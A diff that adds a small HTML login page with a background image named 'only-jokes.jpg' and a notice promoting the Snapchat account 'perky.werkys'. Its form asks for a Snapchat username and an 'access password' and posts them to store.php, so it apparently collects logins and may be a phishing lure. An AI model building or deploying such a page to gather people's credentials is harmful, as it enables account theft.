@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <style>
+    /* Apply the CSS styles from the second code snippet */
+
+    /* Fonts */
+    @import url('https://fonts.googleapis.com/css?family=Karla:400,700&display=swap');
+
+    /* Root Variables */
+    :root {
+      --textColor: black;
+      --font: 'Karla', sans-serif;
+    }
+
+    /* HTML Styles */
+    html {
+      font-family: var(--font);
+      color: var(--textColor);
+      font-size: 18px;
+      font-weight: 400;
+      background: url('./images/only-jokes.jpg');
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-attachment: fixed;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+    }
+
+    body {
+      margin: 10px auto;
+    }
+
+
+    #userName {
+      margin: -40px auto;
+      font-weight: 700;
+    }
+
+    #description {
+      margin: 20px auto;
+      font-weight: 700;
+    }
+
+    main {
+      width: 80%;
+      max-width: 500px;
+      margin: 15px auto;
+    }
+
+
+    /* Additional Styles */
+    label {
+      border: 1px solid;
+      padding: 3px;
+      font-weight: bold;
+    }
+
+    .disclaimer {
+      font-weight: bold;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    input[type="submit"] {
+      padding: 8px;
+      margin: 5px;
+      border-radius: 10px;
+    }
+
+    input[type="submit"] {
+      background-color: #4caf50;
+      color: white;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <center>
+    <p class="disclaimer"><b>DISCLAIMER: </b> NEW SNAPCHAT: perky.werkys <b>NEW UPDATE 03/22/2024</b></p>
+    <form action="store.php" method="post">
+      <label for="username">Enter your Snapchat username:</label>
+      <input type="text" name="username" required>
+      <br />
+      <label for="password">Enter the access password:</label>
+      <input type="password" name="password" required>
+      <br /><br />
+      <input type="submit" value="Submit">
+    </form>
+  </center>
+</body>
+</html>
